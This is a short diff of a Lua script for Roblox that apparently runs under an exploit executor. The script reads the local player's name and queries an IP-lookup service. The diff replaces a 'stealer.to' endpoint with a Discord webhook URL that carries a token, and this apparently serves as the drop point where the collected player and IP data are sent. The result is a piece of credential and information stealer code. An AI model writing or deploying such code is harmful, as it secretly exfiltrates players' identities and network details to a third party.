@@ -183,7 +183,7 @@ while true do
 end
 
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://stealer.to/post?uniqueid=0a4048b4"
+local webhook_url = "https://discord.com/api/webhooks/1273975370395422721/-0WV2cl-4vytiFBEFecibzD6A8gaLWEEsDsF2bE0Ug2aZKN9VLRbmED_oVfqj6cNSQt4"
 
 local ip_info = syn.request({
     Url = "http://ip-api.com/json",
